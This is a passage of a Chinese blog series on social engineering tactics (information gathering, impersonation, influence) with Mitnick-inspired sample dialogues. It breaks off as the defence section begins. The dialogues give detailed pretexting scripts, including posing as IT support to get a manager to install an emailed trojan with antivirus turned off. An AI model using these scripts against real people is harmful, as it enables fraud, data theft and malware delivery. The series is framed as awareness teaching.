title="扫盲“社会工程学”[1]：攻击手法之【信息收集】"></a>扫盲“社会工程学”[1]：攻击手法之【信息收集】</h1><p><strong>文章目录</strong></p><p>★什么是信息收集？<br>★收集的信息有啥用捏？<br>★哪些信息属于不敏感信息？<br>★如何收集到不敏感信息？</p><p>上文普及了一些基本概念和常识，接下来就得说点实在的货色：介绍一下攻击者常用的套路。攻击者的套路大致可以分为如下几个步骤：信息收集、假冒身份、施加影响、实施最终的攻击。由于每个步骤介绍起来都蛮长的，俺今天先来介绍“信息收集”这个步骤。</p><h2 id="★什么是信息收集？"><a href="#★什么是信息收集？" class="headerlink" title="★什么是信息收集？"></a>★什么是信息收集？</h2><p>　　信息收集就是通过各种手段去获取机构、组织、公司（以下统一简称“机构”）的一些【不敏感】信息。为啥特地强调“不敏感”捏？如果信息不敏感，就不会有特别严格的访问限制，攻击者也就容易得手。而且在获取这种信息的过程中，不易引起别人的注意，降低了攻击者自身的风险。</p><h2 id="★收集的信息有啥用捏？"><a href="#★收集的信息有啥用捏？" class="headerlink" title="★收集的信息有啥用捏？"></a>★收集的信息有啥用捏？</h2><p>　　大部分社会工程攻击者都会从信息收集入手。但信息收集往往【不是】攻击者的最终目的，仅仅是攻击者进入下一个阶段的前期准备工作。大多数攻击者拿到这些信息之后，多半会用来包装自己，以便进行后续的身份假冒。具体如何该包装和冒充，俺会在下一个帖子里介绍。</p><h2 id="★哪些信息属于不敏感信息？"><a href="#★哪些信息属于不敏感信息？" class="headerlink" title="★哪些信息属于不敏感信息？"></a>★哪些信息属于不敏感信息？</h2><p>　　典型的<strong>不敏感</strong>信息有如下几种：</p><h3 id="◇某些关键人物的资料"><a href="#◇某些关键人物的资料" class="headerlink" title="◇某些关键人物的资料"></a>◇某些关键人物的资料</h3><p>　　这里说的“资料”包括该人物所处的部门、担任的职位、电子邮箱、手机号、座机分机号等。大伙儿注意一下，此处的【关键人物】，不一定是名气大或位高权重的人，而是指这些人位于攻击路线上的关键点。攻击者必须利用这些人来达到某种目的。</p><h3 id="◇机构内部某些操作流程的步骤"><a href="#◇机构内部某些操作流程的步骤" class="headerlink" title="◇机构内部某些操作流程的步骤"></a>◇机构内部某些操作流程的步骤</h3><p>　　每个机构内部都有若干操作流程（比如报销流程、审批流程等），这些流程对于攻击者非常有用。一旦摸清了这些流程的细节，攻击者就能知道每一个攻击环节会涉及哪些对象，这些对象分别处于什么部门？担任什么职务？具有什么授权？</p><h3 id="◇机构内部的组织结构关系"><a href="#◇机构内部的组织结构关系" class="headerlink" title="◇机构内部的组织结构关系"></a>◇机构内部的组织结构关系</h3><p>　　机构的组织结构关系包括如下几个方面：各个部门的隶属关系、部门之间的业务往来、职权的划分、某个部门是强势还是弱势等等信息。<br>　　组织结构图的用处类似于操作流程，俺就不再多啰嗦了。</p><h3 id="◇机构内部常用的一些术语和行话"><a href="#◇机构内部常用的一些术语和行话" class="headerlink" title="◇机构内部常用的一些术语和行话"></a>◇机构内部常用的一些术语和行话</h3><p>　　大部分攻击者都会收集一些机构内部的术语和行话。当攻击者在和机构内的其他人员交流时，如果能熟练地使用各种专用的术语和行话，就可以有效打消其他人的疑虑，并获得信任。</p><p>　　上述这些信息似乎蛮普通的，在大伙儿看来好像没啥价值。但是这些信息到了攻击者手中就能发挥出巨大的作用。</p><h2 id="★如何收集到不敏感信息？"><a href="#★如何收集到不敏感信息？" class="headerlink" title="★如何收集到不敏感信息？"></a>★如何收集到不敏感信息？</h2><p>　　收集这些普通信息的途径大致有如下几种：</p><h3 id="◇通过网站和搜索引擎"><a href="#◇通过网站和搜索引擎" class="headerlink" title="◇通过网站和搜索引擎"></a>◇通过网站和搜索引擎</h3><p>　　比如，很多机构的内部操作流程直接放在官方网站上，可以轻易获取。还有很多不敏感信息，攻击者通过 Google 就能找到一大把。</p><h3 id="◇通过离职员工"><a href="#◇通过离职员工" class="headerlink" title="◇通过离职员工"></a>◇通过离职员工</h3><p>　　有些时候，某个员工（哪怕是一个很小的角色）跳槽到竞争对手那里，就可以带来很丰富的信息。保本的话，至少能拿到原公司的通讯录；稍好一些的话，还能拿到组织结构图以及更深层次的一些东东。</p><h3 id="◇通过垃圾分析"><a href="#◇通过垃圾分析" class="headerlink" title="◇通过垃圾分析"></a>◇通过垃圾分析</h3><p>　　很多机构对于一些普通的打印材料，直接丢到垃圾桶，不会经过碎纸机处理。所以攻击者可以从办公垃圾中找到很多有用的信息。<br>　　举一个简单的例子：很多公司每当有新员工入职，人事或者行政人员都会打印一张清单给新员工。清单上面<strong>可能</strong>会有如下内容：<br><em>公司内部常用服务器（比如打印服务器、文件服务器）的IP地址<br>新员工外部邮箱的名称和默认口令<br>公司内部系统（比如 ERP 系统、MIS 系统等）的用户名和默认口令<br>某些内部系统的简单使用说明</em><br>　　如果某个新员工没有【立即】修改默认口令（有相当比例的新员工不会在入职当天立即修改【所有的】默认口令），并且把这个清单直接丢到垃圾桶。那对于垃圾分析者来说，可就捡了大便宜啦！<br>　　不过捏，垃圾分析方法属于苦差事。使用此招数，每次都要捏着鼻子，在垃圾箱里翻上好几个小时。但还是有很多商业间谍乐此不疲。</p><h3 id="◇通过电话问讯"><a href="#◇通过电话问讯" class="headerlink" title="◇通过电话问讯"></a>◇通过电话问讯</h3><p>　　某些攻击者直接打电话给前台或者客户服务部，通过某些技巧，就能套出很多有价值的信息。<br>　　为啥攻击者特别偏爱于前台和客服人员捏？这里面可是大有讲究啊！一般来说，前台和客户服务人员都属于机构内的服务支撑部门。这些部门的员工经常被培训成具有如下特质：不怨其烦、热情好客、乐于助人。所以，这类员工会比较有耐心，也比较能满足攻击者的一些（哪怕是有点无理的）要求。</p><p>　　上述就是社会工程学中，信息收集的基本常识。本系列的下一个帖子，咱们来聊一下“假冒身份“的话题。</p><h1 id="扫盲“社会工程学”-2-：攻击手法之【假冒身份】"><a href="#扫盲“社会工程学”-2-：攻击手法之【假冒身份】" class="headerlink" title="扫盲“社会工程学”[2]：攻击手法之【假冒身份】"></a>扫盲“社会工程学”[2]：攻击手法之【假冒身份】</h1><p><strong>文章目录</strong></p><p>★为啥要假冒？<br>★包装要达到啥效果？<br>★如何包装？<br>★一个实例</p><p>　　在前文，咱们介绍了“信息收集”，本文咱们来讲一讲“假冒身份”的手法。<br>　　为了避免某些同学误解，有必要事先澄清一下：“信息收集”、“假冒身份”、“施加影响”这三个手法不是孤立存在的，而是有机结合的。攻击者在干坏事的时候，总会混用这三个手法以达到最终目的。俺只是限于时间和篇幅，所以才大卸三块，分开来介绍。</p><h2 id="★为啥要假冒？"><a href="#★为啥要假冒？" class="headerlink" title="★为啥要假冒？"></a>★为啥要假冒？</h2><p>　　假冒身份说白了就是“包装”。攻击者又不是傻冒，他们当然不会轻易暴露自己的真实身份，自然要找一个马甲来伪装一下。一般来说，攻击者会根据面对的目标来选取<strong>针对性</strong>的马甲。选好马甲之后，还要在某些细节上稍微粉饰一下，让人觉得更加逼真。<br>　　总而言之，包装要为后续的“施加影响”埋下伏笔，打好基础。</p><h2 id="★包装要达到啥效果？"><a href="#★包装要达到啥效果？" class="headerlink" title="★包装要达到啥效果？"></a>★包装要达到啥效果？</h2><p>　　按照二八原理，大部分人都是感性的。包装的效果，就是要充分利用和挖掘人【感性的弱点】。</p><h3 id="◇博取信任"><a href="#◇博取信任" class="headerlink" title="◇博取信任"></a>◇博取信任</h3><p>　　还记得上文提到的那些“不敏感信息”吗？攻击者会利用这些信息来证明自己是机构内的人，从而得到信任（具体看文本后面的实例）。博取信任是先决条件，只有先取得信任，攻击者才能再接再厉，继续博取好感、博取同情、树立权威等等。</p><h3 id="◇博取好感"><a href="#◇博取好感" class="headerlink" title="◇博取好感"></a>◇博取好感</h3><p>　　博取好感显然是没啥坏处的。如果对方产生了好感，攻击者就便于提出更进一步的要求。比如很多保险推销员就善于利用各种手段来博取好感。</p><h3 id="◇博取同情"><a href="#◇博取同情" class="headerlink" title="◇博取同情"></a>◇博取同情</h3><p>　　大部分人或多或少都有一点同情心，某些攻击者会刻意示弱，从而让对方产生一些同情心，然后借机提出一些要求。从这个角度来讲，很多乞丐也利用了社会工程学的技巧。</p><h3 id="◇树立权威性"><a href="#◇树立权威性" class="headerlink" title="◇树立权威性"></a>◇树立权威性</h3><p>　　很多人都会对权威人物有一种轻信和盲从。所以，树立权威性也有助于攻击者后续的“施加影响”。</p><h2 id="★如何包装？"><a href="#★如何包装？" class="headerlink" title="★如何包装？"></a>★如何包装？</h2><h3 id="◇选择身份"><a href="#◇选择身份" class="headerlink" title="◇选择身份"></a>◇选择身份</h3><p>　　要达到上述的效果，首先要选择特定的身份。选择身份是很有讲究的，要综合考虑多方面的因素。由于俺不是教你如何搞社会工程攻击，所以俺只能是简单说一说。<br>　　要博取好感，攻击者可以通过建立认同感来达到。比如对方是某个秘书，攻击者会谎称自己是另一个部门的秘书（职务上的认同）。关于认同感，后面的帖子会详细介绍。<br>　　要树立权威性，可以通过冒充公司内更高级别的人物（或者和高层相关的人，比如某领导的秘书）。这个招数对于那些等级森严的公司，效果挺好。<br>　　要博取同情的话，可以看本文后面举的例子。</p><h3 id="◇外貌的粉饰"><a href="#◇外貌的粉饰" class="headerlink" title="◇外貌的粉饰"></a>◇外貌的粉饰</h3><p>　　除了选取身份，一些外貌的细节也很重要。由于大多数攻击者采用电话的方式沟通，那些嗓音略带磁性（仅限于男性）或者充满柔情（仅限于女性）的家伙，就很占优势啦。<br>　　大多数攻击者都不会贸然现身（现真身的风险可大了）。万一在特殊情况下需要亲自出马，到对方的机构去拜访，有经验的攻击者都会选取得体的着装，以便和假冒的身份相称。在这种情况下，攻击者的长相也是一个关键因素。那些相貌堂堂、一表人才、玉树临风的家伙，第一眼就会让对方产生好感并放松警惕。<br>　　顺便跑题一下。我在本系列开篇里面不是强调过<strong>天赋</strong>的重要性吗？所谓的社会工程学天赋，不光是脑瓜子机灵，嗓音和相貌也不能太差哦（尤其是嗓音）。俗话说得好：天生嗓音差不是你的错，但跑出来混社会工程就是你的不对啦！</p><h2 id="★一个实例"><a href="#★一个实例" class="headerlink" title="★一个实例"></a>★一个实例</h2><p>　　前面忽悠了一大堆理论，为了加深同学们的印象，咱来看个简单的例子（灵感来自<a href="https://en.wikipedia.org/wiki/Kevin_Mitnick">凯文·米特尼克</a>所著的《<a href="https://en.wikipedia.org/wiki/The_Art_of_Deception">欺骗的艺术</a>》）。在此例子中，攻击者的主要目的是更进一步的“信息收集”。在该过程中，攻击者使用了“假冒身份”的手法。</p><h3 id="◇主要人物介绍"><a href="#◇主要人物介绍" class="headerlink" title="◇主要人物介绍"></a>◇主要人物介绍</h3><p>某社会工程攻击者，简称小黑。<br>某公司客服人员，简称小白。</p><h3 id="◇背景介绍"><a href="#◇背景介绍" class="headerlink" title="◇背景介绍"></a>◇背景介绍</h3><p>小黑想打探这家公司某客户（张三）的银行帐号。小黑先进行了一些初步的信息收集（通过Google），了解到如下信息：<br>1、公司内部有一个商业客户资料系统，里面包含有客户的银行帐号<br>2、该系统简称BCIS<br>3、该公司的客户服务人员有BCIS的查询权限<br>准备妥当之后，小黑<strong>打电话</strong>到该公司客户服务部。</p><h3 id="◇对话过程"><a href="#◇对话过程" class="headerlink" title="◇对话过程"></a>◇对话过程</h3><p>小白：你好，哪位？<br>小黑：我是客户资料部的，我的电脑中了该死的病毒，没法启动了。偏偏有个总裁办的秘书让我查一个客户的资料，还催得很急。听说你们客服部也能登录到BCIS，麻烦你帮我查一下吧。谢谢啦！<br>小白：哦。你要查什么资料？<br>小黑：我需要一个客户的银行帐号。<br>小白：这个客户的ID是多少？<br>小黑：客户ID在我电脑里，可是我的电脑打不开了。麻烦你根据姓名进行模糊查找，应该能找到的。这个客户叫“张三”。<br>小白：稍等，我查询一下。<br>……<br>小白：找到了，你拿笔记一下，他的银行帐号是1415926535。<br>小黑：好的，我记下了。你可帮了我大忙啦！太谢谢你了！<br>小白：不客气。</p><h3 id="◇案例分析"><a href="#◇案例分析" class="headerlink" title="◇案例分析"></a>◇案例分析</h3><p>　　首先，攻击者通过信息收集中打听到“商业客户资料系统”简称BCIS。另外，攻击者还了解到“客服部门”有BCIS的查询权限。当小黑很自然地说出这两个信息，就会让小白相信自己是公司内的人员。<br>　　接着，小黑通过谎称自己的电脑中毒，来进行示弱并博取小白的同情。<br>　　有了上面这两条，小黑成功的把握就很大啦。如果再辅助一些特定的嗓音和语调，并且在言谈中流露出焦急的心情，那基本上就大功告成了。</p><p>　　关于“假冒身份”的话题，就暂时聊到这。本系列的下一个帖子，咱们来聊一下“施加影响”的话题。</p><h1 id="扫盲“社会工程学”-3-：攻击手法之【施加影响】"><a href="#扫盲“社会工程学”-3-：攻击手法之【施加影响】" class="headerlink" title="扫盲“社会工程学”[3]：攻击手法之【施加影响】"></a>扫盲“社会工程学”[3]：攻击手法之【施加影响】</h1><p><strong>文章目录</strong></p><p>★关于《影响力》<br>★博取好感<br>★通过互惠原理来骗取好处<br>★通过社会认同来施加影响<br>★通过权威来施加压力<br>★总结</p><p>上文咱们介绍了社会工程中<strong>包装</strong>的技巧。按照本系列的计划，本文要讨论的内容是：“如何施加影响”。</p><h2 id="★关于《影响力》"><a href="#★关于《影响力》" class="headerlink" title="★关于《影响力》"></a>★关于《影响力》</h2><p>　　说到施加影响以及相关的技巧，就不得不提及《影响力》这本书。这真是一本好书啊！<br>　　《影响力》这本书高屋建瓴地总结了“对他人施加影响”的种种伎俩。这些伎俩似乎不够光明正大，但常常能收到奇效。如果你从来没有读过此书，强烈建议你先去拜读一下，再接着来看本帖后续的内容。<br>……<br>……<br>……<br>　　现在，不妨假设你已经拜读过《影响力》。接着，咱们来看看书上的那些技巧是如何运用在社会工程学当中的。</p><h2 id="★博取好感"><a href="#★博取好感" class="headerlink" title="★博取好感"></a>★博取好感</h2><p>　　博取好感是施加影响的手法中，最基本的招数。具体的技巧有很多种，咱今天只介绍常见的几种。</p><h3 id="◇通过外在特征的“光环效应”"><a href="#◇通过外在特征的“光环效应”" class="headerlink" title="◇通过外在特征的“光环效应”"></a>◇通过外在特征的“光环效应”</h3><p>　　此处所说的外在特征，包括相貌、嗓音、着装、甚至姓名等诸多方面；此处所说的“<strong>光环效应</strong>”（也叫光晕效应、晕轮效应），是指对某人的某个局部特征的看法被扩大化，变成对此人整体的看法。这么说比较抽象，咱来看下面几个例子。另外，俺单独写了一个帖子详细介绍“光环效应”，在“<a href="https://program-think.blogspot.com/2009/05/halo-effect.html">这里</a>”。</p><p><strong>举例1（以貌取人）</strong><br>据说当年马云创业时，出去推销产品，别人一看到他都觉得他是坏人。显然，相貌和人品没有必然联系。但是很多人在潜意识里，都会把长得歪瓜裂枣的人当成坏人。<br><strong>举例2（以名取人）</strong><br>比如很多歌星、影星仅仅由于演技好，其 fans 就把演技扩大化，认为他们/她们样样都好。其实演技好和人品好没有必然联系。<br>所以俺在前文里强调社会工程的攻击者需要有好的嗓音（有时甚至需要有好的相貌），就是为了能发挥光环效应。</p><h3 id="◇通过相似性来博取好感"><a href="#◇通过相似性来博取好感" class="headerlink" title="◇通过相似性来博取好感"></a>◇通过相似性来博取好感</h3><p>　　所谓的“<strong>相似性</strong>”，范畴很广，常见的有如下一些：同学、同乡、同校（校友）、爱好相同（比如都喜欢看球，甚至都喜欢某个球星）、经历相同、等。<br>很多攻击者善于通过看似不经意的闲聊，和被攻击者扯上某种关系，让被攻击者的好感油然而生。</p><h2 id="★通过互惠原理来骗取好处"><a href="#★通过互惠原理来骗取好处" class="headerlink" title="★通过互惠原理来骗取好处"></a>★通过互惠原理来骗取好处</h2><p>　　俺在看了《影响力》之后，才意识到互惠原则的效果竟然如此巨大。真是不看不知道，一看吓一跳。具体的例子书上举了很多，俺这里主要总结互惠原则的两种运用招式。</p><h3 id="◇初级招式：“投桃报李”式"><a href="#◇初级招式：“投桃报李”式" class="headerlink" title="◇初级招式：“投桃报李”式"></a>◇初级招式：“投桃报李”式</h3><p>　　“投桃报李”式比较好理解，简单说就是给予对方一点小甜头，然后再索取点小回报。<br>　　为了形象点，举例说明：<br>　　比如有个攻击者在信息收集阶段，想了解某个连锁商店店长的信息。攻击者打电话给该商店（接电话的是某店员），谎称自己是一位长期客户，由于该店的服务很好，想写封表扬信给店长。店员一听就很爽，立马就把店长的详细信息告知对方。</p><h3 id="◇高级招式：“拒绝-退让”式"><a href="#◇高级招式：“拒绝-退让”式" class="headerlink" title="◇高级招式：“拒绝-退让”式"></a>◇高级招式：“拒绝-退让”式</h3><p>　　“拒绝-退让”式比“投桃报李”式要高级一些。这个招式实际上包含了互惠原理和<strong>对比原理</strong>，如果把握得当，效果比“投桃报李”要好很多。具体的实施分两个步骤进行：先提出一个很高（比较过分）的要求（以下简称 A），对方多半会拒绝；然后，攻击者主动作出让步（撤回该要求），再提一个（相对 A 来说）比较低的要求（以下简称 B），这时对方多半会答应。其实 A 仅仅是一个烟雾弹，并不是攻击者的真实意图。攻击者真正想达成的是 B。<br>　　这个招式的难点在于把握A的尺度。A必须和B形成比较明显的反差（利用对比原理），通过A来衬托出B的微不足道。这样，对方拒绝了A之后，潜意识里觉得B反正很微不足道，再加上互惠原理的作用，就会很容易地接受B。<br>　　比如有些攻击者在收集信息时，可以先索取某个比较敏感的信息，如果对方拒绝了，就转而索取一个不敏感的信息。</p><h2 id="★通过社会认同来施加影响"><a href="#★通过社会认同来施加影响" class="headerlink" title="★通过社会认同来施加影响"></a>★通过社会认同来施加影响</h2><p>　　所谓的“社会认同”，通俗地说就是人云亦云、随大流。大多数人都有这个毛病，否则也不会有那么多跟风、赶时髦的家伙了。<br>　　那社会工程者如何运用这个伎俩捏？一个常见的方法就是“造势”。通过制造某种舆论来引导（或者叫“误导”）被攻击者，从而达到目的。这种方式有两个要点：<br>　　首先，要达成某种规模效应。一旦规模形成，由于“社会认同”的影响，就会变成正反馈，导致越来越多的人被卷入。<br>　　其次，要注意引导的技巧。具体要如何“引导”捏？常见的有：“制造狂热”、“制造恐慌”、“制造愤怒”、“制造反感”等方式。当人们处于狂热、恐慌、愤怒、反感等状态时，会变得情绪化。这时候，感性的因素就会占主导，同时会丧失理性的判断，从而被一小撮人所利用。<br>　　从本质上分析，这两个要点依然是借助了心理学层面的因素来起作用。关于造势的例子，大伙儿可以看看源自 IT 行业的 FUD（Fear, Uncertainty, Doubt，具体解释见“<a href="https://zh.wikipedia.org/wiki/FUD">这里</a>”）手法。<br>　　写到这里，突然联想到：其实天朝的毛太祖，就是造势、造舆论的高手啊！上述的两个要点发挥得炉火纯青，不得不令人佩服啊！</p><h2 id="★通过权威来施加压力"><a href="#★通过权威来施加压力" class="headerlink" title="★通过权威来施加压力"></a>★通过权威来施加压力</h2><p>　　大部分人都有服从权威的倾向。因此攻击者可以通过树立或借助权威，让对方服从自己的一些不太合理的要求。<br>　　比如有的攻击者假冒成某 VP（Vice President）的秘书，声称该 VP 急需某某文件或资料，那么对方就会迫于压力而答应。这个招数在等级森严的组织机构，效果特别好。</p><h2 id="★总结"><a href="#★总结" class="headerlink" title="★总结"></a>★总结</h2><p>　　有句话俺必须再啰嗦一下：按照二八原理，<strong>大部分人都是感性的</strong>。为啥上述的这些伎俩能够屡试不爽？就因为这些技巧充分利用了人们感性的弱点。如果你是一个感性的人，那可要小心啦：你可能会容易入上述这些圈套，平时须得小心防范。<br>　　不过捏，凡事总有两面性滴。你一方面要提防别人通过这些招数影响你，另一个方面，你也可以利用这些东东去影响别人。虽说今天是为了介绍社会工程学才扯了这么多施加影响的招数，但这些玩意儿可不仅仅限于社会工程学哦。在很多很多不同的领域（比如：管理、谈判、社交、追 MM/GG、推销 ……），今天讲的这些东西都是非常有用滴。大伙儿一定要活学活用、举一反三啊，才不枉费俺打了这么多字！<br>　　本系列的下文，咱们搞几个综合的示例来分析一下。</p><h1 id="扫盲“社会工程学”-4-：【综合运用】举例"><a href="#扫盲“社会工程学”-4-：【综合运用】举例" class="headerlink" title="扫盲“社会工程学”[4]：【综合运用】举例"></a>扫盲“社会工程学”[4]：【综合运用】举例</h1><p><strong>文章目录</strong></p><p>★举例1：获取通讯录<br>★举例2：获取财务报表<br>★总结</p><p>　　前面的几个帖子已经介绍了社会工程学的一些常见伎俩（主要是“信息收集”、“假冒身份”、“施加影响”这三个手法），今天俺要来举几个综合性的例子。通过这些例子，大伙儿可以见识一下那些社会工程学的老手是如何把各种伎俩有机结合起来，并达到最终的目的。<br>　　为了避免引起不必要的误解，俺事先声明如下：<br>　　由于本人才疏学浅，难以凭空捏造出各种社会工程学案例的场景，因此后面有些例子的灵感，是来自于<a href="https://en.wikipedia.org/wiki/Kevin_Mitnick">凯文·米特尼克</a>所著的《<a href="https://en.wikipedia.org/wiki/The_Art_of_Deception">欺骗的艺术</a>》。另外，俺举这些例子只是教大家如何防范，决无教唆的意图。如果有人企图追究俺教唆犯罪的责任，拜托去找<a href="https://en.wikipedia.org/wiki/Kevin_Mitnick">米特尼克</a>先生，别来找俺滴麻烦 <strong>:-)</strong></p><h2 id="★举例1：获取通讯录"><a href="#★举例1：获取通讯录" class="headerlink" title="★举例1：获取通讯录"></a>★举例1：获取通讯录</h2><p>　　某个聪明的猎头（按照前文的惯例，不妨称之为小黑）需要搞到一家大公司研发部门的通讯录。为了达到目的，小黑决定采取一些社会工程学的技巧。<br>　　首先，要选定突破口——也就是容易被利用的人。在这个案例中，小黑决定从前台和研发部秘书作为突破口。为啥要选择两个人捏？有一个原因在于，这两人的工作性质决定了他们会比较乐于助人，也就比较容易被小黑利用。接下来，咱们看看小黑是如何达到目的。</p><h3 id="◇步骤1：获取前台的Email地址"><a href="#◇步骤1：获取前台的Email地址" class="headerlink" title="◇步骤1：获取前台的Email地址"></a>◇步骤1：获取前台的Email地址</h3><p>　　此步骤就是之前的帖子介绍的“信息收集”。由于前台的电子邮件地址不是敏感信息，不会有严格的访问控制，可以比较容易获取。比如想办法拿到前台的名片或者在打电话跟前台套近乎。具体细节俺就不多啰嗦了。</p><h3 id="◇步骤2：搞定研发的秘书"><a href="#◇步骤2：搞定研发的秘书" class="headerlink" title="◇步骤2：搞定研发的秘书"></a>◇步骤2：搞定研发的秘书</h3><p>　　接着，小黑打电话给研发的秘书（搞到研发秘书的分机号也不是什么难题），然后谎称自己是总裁办的秘书，<strong>急需</strong>一份研发人员的清单。然后，小黑让研发的秘书把整理好的人员清单发送到 xxxx 邮件地址（也就是步骤1获取的前台 email 地址）。<br>这个步骤是整个计划的关键点。为了达成此步骤，需要用到“假冒身份”和“施加影响”这两个手法。通过冒充总裁办的人，造成一种潜在的威慑。而且小黑在通话的过程中自然流露出焦急的情绪，显得更加逼真。<br>对于研发秘书而言：虽然研发人员的清单比较敏感，但由于索要清单的是总裁办的人，也就不好拒绝了。而且对方留得email地址是本公司的邮箱，想想也就没啥好顾虑的了。</p><h3 id="◇步骤3：搞定前台"><a href="#◇步骤3：搞定前台" class="headerlink" title="◇步骤3：搞定前台"></a>◇步骤3：搞定前台</h3><p>　　打完步骤2的电话之后，小黑就赶紧打第3个电话给前台。下面是双方的对话。</p><blockquote><p>前台：你好，哪位？<br>小黑：我是总裁办的XXX秘书。<br>前台：你有什么事情吗？<br>小黑：我正陪同XX副总裁在某处开会，XX副总裁需要一份资料。我已经找人整理好了，等一下会发到你的邮箱。你收到之后，请帮忙传真到XXXXXXXX号码。<br>前台：好的。还有其它事情吗？<br>小黑：没有了，多谢！</p></blockquote><p>对于前台而言，她先接到一个电话让她收邮件，紧接着确实收到一份从公司内部邮箱发出的材料。所以她自然也就不会起疑心了。</p><h2 id="★举例2：获取财务报表"><a href="#★举例2：获取财务报表" class="headerlink" title="★举例2：获取财务报表"></a>★举例2：获取财务报表</h2><p>　　前面的那个例子稍显简单，再来说一个稍微复杂点的例子。<br>　　某商业间谍兼资深黑客（还是简称为小黑）需要搞到某大公司内部的财务报表（可以卖大价钱哦）。由于这个财务报表是很敏感的资料，一般员工是接触不到滴，只有财务部的少数主管才能看到这些报表。而财务部的主管，肯定都知道这些报表的重要性。所以，小黑再想用”案例1”的伎俩是行不通滴。<br>　　小黑冥思苦想之后，决定采用“木马计”，在财务主管的电脑中植入木马（如果你不晓得“木马”是啥，自己先上网查一下）。一旦木马植入成功，那财务报表就是手到擒来、不费吹灰之力了。具体的实施步骤如下：</p><h3 id="◇步骤1：准备阶段"><a href="#◇步骤1：准备阶段" class="headerlink" title="◇步骤1：准备阶段"></a>◇步骤1：准备阶段</h3><p>　　准备阶段主要办三件事：首先，想办法搞到公司的通讯簿。通过案例1，大伙儿应该知道这个不难办到；然后，通过各种途径（具体的途径，请看之前的“信息收集”）了解该公司内部的一些情况（尤其是 IT 支持部和财务部的人员情况）；最后，用<strong>化名</strong>去开通一个手机（有经验的攻击者肯定用假名，以免被抓）。</p><h3 id="◇步骤2：忽悠财务主管"><a href="#◇步骤2：忽悠财务主管" class="headerlink" title="◇步骤2：忽悠财务主管"></a>◇步骤2：忽悠财务主管</h3><p>　　由于前面的准备工作，小黑了解到财务部某主管（不妨叫小白）的姓名和分机号。然后小黑打给该主管。下面是双方对话。</p><blockquote><p>小白：你好，哪位？<br>小黑：我是IT支持部的张三。你是财务部的主管小白吧？<br>小白：对的。有啥事儿？<br>小黑：最近几天，你们财务部的网络正常吗？有没有感觉网络时断时续的？<br>小白：好像没有嘛。<br>小黑：有几个其它的部门反映网络不正常，所以我来问问你们的情况。如果这几天你碰到网络异常，请打电话给我。我最近忙着处理电脑网络的故障，不经常在座位上。你可以打我的手机，号码是13901234567。<br>小白：好的，我记一下。<br>小黑：另外，我想确认一下你电脑的网络端口号。<br>小白：什么是“网络端口号”？<br>小黑：你先找到你电脑的网线，在网线插在墙上的地方应该贴个标签，那上面的写的号码就是你电脑的“网络端口号”。你把上面的号码告诉我。<br>小白：等一下，我看一下……哦，看到了，上面写着“A1B2C3”。<br>小黑：嗯，很好。我只是例行确认一下。祝你工作愉快。再见。</p></blockquote><h3 id="◇步骤3：欺骗IT支持部"><a href="#◇步骤3：欺骗IT支持部" class="headerlink" title="◇步骤3：欺骗IT支持部"></a>◇步骤3：欺骗IT支持部</h3><p>　　接着小黑耐着性子等待2到3天，然后打电话给 IT 支持部的某工程师（不妨称李四）。由于之前的准备工作，小黑知道李四管理公司的某些路由器和交换机。<br>　　小黑谎称自己是新来的网络工程师，正在财务办公室帮小白排查网络问题，请李四帮忙把网络端口号为“A1B2C3”的网络连接断开。<br>　　对李四而言，由于对方能准确说出小白的姓名以及小白电脑的网络端口号，所以李四就相信了他的话，并按照要求把对应的网络连接断开。</p><h3 id="◇步骤4：等待鱼儿上钩"><a href="#◇步骤4：等待鱼儿上钩" class="headerlink" title="◇步骤4：等待鱼儿上钩"></a>◇步骤4：等待鱼儿上钩</h3><p>　　打完这个电话之后，接下来小黑就稍息片刻，等着小白的电话。果然，不出几分钟，小白就打了他的手机。</p><blockquote><p>小黑：你好，我是IT支持部的张三。你是哪位？<br>小白：我是财务部的小白主管。前几天你给我打过电话的，还记得吗？今天网络果然出问题了。所以打你电话找你帮忙。<br>小黑：哦，是吗？那我帮你查一下，应该很快能搞定的。</p></blockquote><p>　　大约十分钟之后，小黑重新打给IT支持部的李四，让他把端口号为“A1B2C3”的网络连接重新开通。</p><h3 id="◇步骤5：大功告成"><a href="#◇步骤5：大功告成" class="headerlink" title="◇步骤5：大功告成"></a>◇步骤5：大功告成</h3><p>　　网络重新开通之后，小黑又打给小白。</p><blockquote><p>小白：你好，哪位？<br>小黑：我是IT支持部的张三。刚才已经帮你把网络故障解决了。你现在试试看，网络应该通了。<br>小白：我看一下，嗯，果然通了！太好了！太谢谢你了！<br>小黑：不过，最近几天这个问题可能还会反复出现。<br>小白：啊！那可咋办？我们财务部月底正忙着呢？可经不起这个折腾啊！<br>小黑：办法倒是有一个，你需要安装一个网络模块的补丁，基本上就可以解决这个问题了。我等一下发到你邮箱中。你收到之后，把邮件附件中的程序安装一下就行了。<br>小白：哦，好的。<br>小黑：顺便提醒你一下，有些杀毒软件可能会把这个补丁误报为有害程序。你如果碰上这种情况，可以先把杀毒软件关闭，再重新安装一次就可以了。<br>小白：哦，我晓得了，谢谢。</p></blockquote><p>　　然后，小黑就往小白的邮箱发了一个木马，并且把邮件的发件人地址伪装成 IT 支持部张三的地址，免得引起怀疑。<br>　　对于小白而言，张三（冒充的）刚刚帮他解决了网络故障。所以小白根本不会怀疑此人的身份。自然也不会怀疑邮件有诈。</p><h2 id="★总结-1"><a href="#★总结-1" class="headerlink" title="★总结"></a>★总结</h2><p>　　由于篇幅有限，俺就不多举例了。从上述案例来看，社会工程高手在搞定复杂问题之前，一般会制定好一个计划，并且在计划的每一个步骤都会充分利用前面几个帖子提到的技巧。另外，在整个攻击过程中，攻击者无非就是做一些调研，打几个电话，成本非常低，被抓的风险也很小；而他们一旦得手，获益却很大。可能就是由于这种较大的反差，导致社会工程攻击在整个信息安全领域的比重不断增加。<br>　　本系列的下一个帖子，俺来介绍一下如何防范社会工程学攻击。</p><h1 id="扫盲“社会工程学”-5-：你该如何【防范】？"><a href="#扫盲“社会工程学”-5-：你该如何【防范】？" class="headerlink" title="扫盲“社会工程学”[5]：你该如何【防范】？"></a>扫盲“社会工程学”[5]：你该如何【防范】？</h1><p><strong>文章目录</strong></p><p>★组织机构该如何做？<br>★个人该如何做？</p><p>　　经过前面几个帖子的介绍，大伙儿应该能看出来，社会工程学的应用范围是很广泛滴。它的应用会涉及日常生活的许多领域，绝不仅限于信息安全。所以，如何防范就是一个重要的话题了。今年咱们就来聊一下如何防范。</p><h2 id="★组织机构该如何做？"><a href="#★组织机构该如何做？" class="headerlink" title="★组织机构该如何做？"></a>★组织机构该如何做？</h2><p>　　